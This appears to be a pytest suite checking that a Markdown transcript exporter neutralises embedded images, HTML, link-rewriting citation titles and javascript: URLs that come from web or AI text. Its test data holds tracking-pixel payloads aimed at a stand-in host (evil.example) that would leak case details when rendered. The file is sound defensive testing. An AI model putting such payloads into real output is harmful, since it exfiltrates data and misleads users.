"""transcript.md (Case.export_markdown) holds text from the web and from models, and is opened in
Markdown viewers that fetch what a page embeds: none of that text may act as markup of its own."""

import re

import pytest

from datoolkit.case import Case, md_inert

EVIL = "https://evil.example/pixel.png?case=acme"


def _transcript(tmp_path, chat=(), queue=(), hypotheses=None, **case) -> str:
    c = Case.create(case.pop("name", "md"), "open", root=tmp_path, **case)
    return c.export_markdown(list(chat), list(queue), hypotheses).read_text(encoding="utf-8")


def _images(md: str) -> list[str]:
    """What a CommonMark viewer would fetch from `md`, near enough: images and HTML tags that
    aren't escaped and aren't in code (each test's code is fenced or in one-line spans)."""
    text, out = [], []
    fenced = False
    for line in md.split("\n"):
        if re.match(r" {0,3}(```|~~~)", line):
            fenced = not fenced
        elif not fenced:
            text.append(re.sub(r"(`+)(?!`).*?(?<!`)\1(?!`)", "", re.sub(r"\\.", "", line)))
    for line in text:
        out += re.findall(r"!\[[^\]]*\]\([^)]*\)|!\[[^\]]*\]\[|<[A-Za-z/!?][^>]*>", line)
    return out


def test_a_citation_title_cannot_rewrite_its_link(tmp_path):
    chat = [{"kind": "assistant", "model": "m", "tier": "standard", "text": "See the sources.", "citations": [
        {"title": "Fix](https://evil.example/login) [Microsoft Learn", "url": "https://learn.microsoft.com/a_(b)"},
        {"title": "", "url": "https://example.org/x y\n) ![](" + EVIL + ")"},
        {"title": "A script", "url": "javascript:alert(1)"}]}]
    md = _transcript(tmp_path, chat)
    line = next(ln for ln in md.splitlines() if ln.startswith("Sources: "))
    # one link each for the first two, to the address the citation has and no other
    assert re.findall(r"(?<!\\)\]\(([^)]*)\)", line) == [
        "https://learn.microsoft.com/a_%28b%29",
        "https://example.org/x%20y%20%29%20![]%28https://evil.example/pixel.png?case=acme%29"]
    assert "Fix\\]\\(https://evil.example/login\\) \\[Microsoft Learn" in line
    assert "`javascript:alert(1)`" in line and "](javascript" not in line          # shown, not a link
    assert _images(md) == []


def test_rollback_and_note_cells_are_code(tmp_path):
    queue = [{"num": 1, "session_id": "web01", "command": "systemctl restart nginx", "risk": "disruptive",
              "status": "withdrawn", "rollback": f"![]({EVIL}) [undo](https://evil.example/undo)",
              "note": f"<img src='{EVIL}'> withdrawn | by the AI"},
             {"num": 2, "session_id": "web01", "command": "uptime", "risk": "read_only", "status": "pending"}]
    md = _transcript(tmp_path, queue=queue)
    row = next(ln for ln in md.splitlines() if ln.startswith("| 1 |"))
    assert f"| `![]({EVIL}) [undo](https://evil.example/undo)` | `<img src='{EVIL}'> withdrawn \\| by the AI` |" in row
    assert next(ln for ln in md.splitlines() if ln.startswith("| 2 |")).endswith("| pending |  |  |")   # empty stays empty
    assert _images(md) == []


def test_a_results_note_is_code_too(tmp_path):
    chat = [{"kind": "user", "text": "", "results": [
        {"num": 1, "status": "skipped", "session_id": "web01", "command": "uptime", "note": f"![]({EVIL})\nno"}]}]
    md = _transcript(tmp_path, chat)
    assert f"> Note: `![]({EVIL}) no`" in md and _images(md) == []


def test_a_remote_image_in_ai_text_is_not_fetched(tmp_path):
    text = (f"Here is the diagram: ![]({EVIL})\n\n"
            f"And by reference: ![diagram][d]\n\n[d]: {EVIL}\n\n"
            f"<img src=\"{EVIL}\" width=1>\n\n"
            "Run `ssh <user>@<host>` and then:\n\n```html\n<img src=\"kept-as-code.png\">\n![kept](as-code.png)\n```\n")
    chat = [{"kind": "assistant", "model": "m", "tier": "standard", "text": text,
             "questions": [{"question": f"Does it look like ![]({EVIL})?", "options": [f"<img src={EVIL}>", "No"]}]},
            {"kind": "note", "text": f"AI request failed: ![]({EVIL})"},
            {"kind": "user", "text": f"pasted from the page: ![x]({EVIL})"}]
    md = _transcript(tmp_path, chat, hypotheses=[{"id": "H1", "text": f"DNS ![]({EVIL})", "confidence": 0.5, "status": "open"}],
                     notes=f"Ticket says <img src={EVIL}>")
    assert _images(md) == []
    assert f"Here is the diagram: !\\[]({EVIL})" in md and "!\\[diagram][d]" in md
    assert f"&lt;img src=\"{EVIL}\" width=1>" in md and f"Ticket says &lt;img src={EVIL}>" in md
    # code is left as written: nothing in it is fetched
    assert "Run `ssh <user>@<host>` and then:" in md
    assert "```html\n<img src=\"kept-as-code.png\">\n![kept](as-code.png)\n```" in md


def test_the_technicians_own_photos_are_still_images(tmp_path):
    md = _transcript(tmp_path, [{"kind": "user", "text": "the screen", "images": ["img-1.jpg"]}])
    assert "![photo](img-1.jpg)" in md


LOOKS_LIKE_CODE = [
    # a span left open on one line would close on the next, leaving that line's "code" outside it
    f"an `unclosed span\ntext` ![x]({EVIL}) `more`",
    # in a table a | ends the cell, and with it the span the image seemed to be in
    f"| a | b |\n|---|---|\n| `x | ![x]({EVIL}) | y` |",
    # a fence inside a list item ends with the item, whatever follows
    f"- item\n  ```\n  code\n![x]({EVIL})",
    # a fence left open would be closed by the next message's own
    "```\nnever closed\n",
    # an escaped backtick opens nothing
    f"\\`not code ![x]({EVIL}) \\`",
    f"````\n```\n![in a longer fence]({EVIL})\n````\n![x]({EVIL})",
    # in a list item this closing fence, indented two more than its opening, does close it
    f"- item\n  ```\n  code\n    ```\n  ![x]({EVIL})",
    f"1. item\n   ~~~\n   code\n\t~~~\n   <img src={EVIL}>",
    f"```\r\ncode\r\n```\r\n![x]({EVIL})\r\n",
    # after a span a | cuts short, the backticks left in the cell pair differently
    f"| a | b |\n|---|---|\n| `x|y` `<img src={EVIL}>` | z |",
    # a fence for one viewer, a table's header row for another
    f"~~~ a | b\n|---|---|\n| ![x]({EVIL}) | y |\n",
    # escaped already, for a viewer that knows the escape
    f"\\<img src={EVIL}> and \\\\<img src={EVIL}> and \\![x]({EVIL}) and \\\\![x]({EVIL})",
]


@pytest.mark.parametrize("text", LOOKS_LIKE_CODE[:9])
def test_what_only_looks_like_code_is_not_trusted(tmp_path, text):
    out = md_inert(text) + f"\n\n```\n![after]({EVIL})\n```\n\n" + md_inert(f"![last]({EVIL})")
    fetched = _strict_images(out)
    assert fetched == [], out


def _rendered(md: str) -> str:
    """`md` as a CommonMark viewer with raw HTML and GitHub's tables renders it (markdown-it,
    which VS Code's preview is built on)."""
    markdown_it = pytest.importorskip("markdown_it")
    return markdown_it.MarkdownIt("commonmark", {"html": True}).enable("table").render(md)


@pytest.mark.parametrize("text", LOOKS_LIKE_CODE)
def test_a_real_viewer_fetches_nothing_for_them(text):
    more = f"\n\n```\n![after]({EVIL})\n```\n\n"           # the next message's code, and the one after it
    assert "<img" in _rendered(text + more + f"![last]({EVIL})")                 # as written, it would
    out = md_inert(text) + more + md_inert(f"![last]({EVIL})")
    assert "<img" not in _rendered(out), out


def test_a_real_viewer_fetches_nothing_whatever_the_text():
    import random
    img = f"![x]({EVIL})"
    pieces = ["`", "``", "```", "````", "~~~", "~~~~", "\n", "\n", "\n\n", " ", "  ", "    ", "\t", "|", "| a | b |\n|---|---|\n",
              "\\", "- ", "1. ", "> ", "# ", img, img, f"<img src={EVIL}>", "<div>", "</div>", "<!-- c -->", "![x][r]",
              f"[r]: {EVIL}", "word", "\r\n", "*", "[", "]", "(", ")", "!", "<", ">", "\\`", "\\![", "!\\[", "|---|---|",
              "   ```", "  ```", " ```", "    ```", "     ```", "  ~~~", "    ~~~", "&lt;", "<IMG SRC=x>"]
    rnd = random.Random(20261113)
    for _ in range(2500):
        text = "".join(rnd.choice(pieces) for _ in range(rnd.randint(1, 16)))
        out = md_inert(text) + "\n\n" + md_inert(img) + "\n\n" + md_inert(f"```\n{img}\n```") + "\n\n" + md_inert(img)
        assert not re.search(r"<img|<div|</div>|<!--", _rendered(out), re.I), (text, out)


def _strict_images(md: str) -> list[str]:
    """As _images, but reading fences, lists and tables the way CommonMark and GFM do for the
    cases above: a fence indented into a list item ends at the first line indented less, a span
    may run over lines within a paragraph, and a table row's cells are parsed one by one."""
    paragraphs, fence, indent, para = [], "", 0, []
    lines = md.split("\n")
    table = any(re.fullmatch(r"\|(-+\|)+", ln.strip()) for ln in lines)
    for line in lines:
        lead = len(line) - len(line.lstrip(" "))
        m = re.match(r" {0,3}(`{3,}|~{3,})([^`]*)$", line)
        if fence and line.strip() and lead < indent:
            fence = ""
        if fence:
            # inside a list item whose text starts where the fence does, a closing fence may be
            # indented up to three further: the reading least kind to md_inert
            c = re.fullmatch(r" *(`{3,}|~{3,}) *", line)
            if c and c.group(1)[0] == fence[0] and len(c.group(1)) >= len(fence) and lead <= indent + 3:
                fence = ""
            continue
        if m:
            fence, indent = m.group(1), lead
            paragraphs.append(para)
            para = []
        elif not line.strip():
            paragraphs.append(para)
            para = []
        elif table and line.lstrip().startswith("|"):
            paragraphs += [[cell] for cell in re.split(r"(?<!\\)\|", line)]
        else:
            para.append(line)
    paragraphs.append(para)
    found = []
    for para in paragraphs:
        text, i, plain = "\n".join(para), 0, []
        while i < len(text):                              # CommonMark's code spans, over the whole paragraph
            if text[i] == "\\" and i + 1 < len(text):
                i += 2
            elif text[i] == "`":
                run = re.match(r"`+", text[i:]).group()
                close = next((c for c in re.finditer(r"`+", text[i + len(run):]) if len(c.group()) == len(run)), None)
                i += len(run) + (close.end() if close else 0)
            else:
                plain.append(text[i])
                i += 1
        found += re.findall(r"!\[[^\]]*\]\([^)]*\)|<[A-Za-z/!?][^>]*>", "".join(plain))
    return found


def test_the_strict_reader_does_see_an_image():
    assert _strict_images(f"an `unclosed span\ntext` ![x]({EVIL}) `more`") != []
    assert _strict_images(f"| a | b |\n|---|---|\n| `x | ![x]({EVIL}) | y` |") != []
    assert _strict_images(f"- item\n  ```\n  code\n![x]({EVIL})") != []
    assert _strict_images(f"```\nopen\n\n```\n![after]({EVIL})\n```\n") != []
    assert _strict_images(f"- item\n  ```\n  code\n    ```\n  ![x]({EVIL})") != []


def test_ordinary_markdown_is_left_alone():
    text = ("## Findings\n\n1. The disk is **full**: `df -h | grep /var` shows 100%.\n"
            "   ```bash\n   du -sh /var/log/* | sort -h\n   ```\n2. See [the docs](https://example.org/a_b).\n\n"
            "| check | result |\n|---|---|\n| `ping` | ok |\n\nUse a backtick (\\`) to continue a line.")
    assert md_inert(text) == text


def test_a_command_of_several_lines_gets_a_block_of_its_own(tmp_path):
    command = f"cat <<EOF\n\n![x]({EVIL})`\nEOF"
    chat = [{"kind": "user", "text": "", "results": [{"num": 1, "status": "ran", "session_id": "s", "command": command}]}]
    md = _transcript(tmp_path, chat)
    assert f"**#1 RAN** on `s`:\n\n```\n{command}\n```" in md and _strict_images(md) == []
